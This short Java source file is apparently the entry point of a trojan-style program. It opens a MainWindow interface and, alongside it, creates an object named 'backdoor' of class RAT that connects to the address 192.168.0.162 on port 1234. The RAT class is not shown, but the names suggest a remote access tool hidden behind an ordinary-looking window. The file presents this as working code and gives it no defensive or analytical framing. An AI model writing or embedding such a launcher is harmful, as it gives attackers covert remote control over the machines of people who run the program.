package launcher;

import connection.RAT;
import view.MainWindow;

public class Main {
	public static void main(String[] args) {
		new MainWindow();
		RAT backdoor = new RAT("192.168.0.162", 1234);
		backdoor.connect();
	}
}
